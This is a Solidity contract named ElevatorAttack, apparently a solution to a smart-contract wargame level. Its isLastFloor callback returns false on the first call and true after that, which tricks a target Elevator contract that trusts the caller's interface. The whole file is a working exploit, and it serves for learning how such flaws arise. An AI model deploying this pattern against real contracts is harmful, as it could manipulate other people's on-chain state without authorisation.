// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator public elevator;
    bool public firstRquest;

    constructor(address target) {
        elevator = IElevator(target);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!firstRquest) {
            firstRquest = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() external {
        elevator.goTo(1);
    }
}
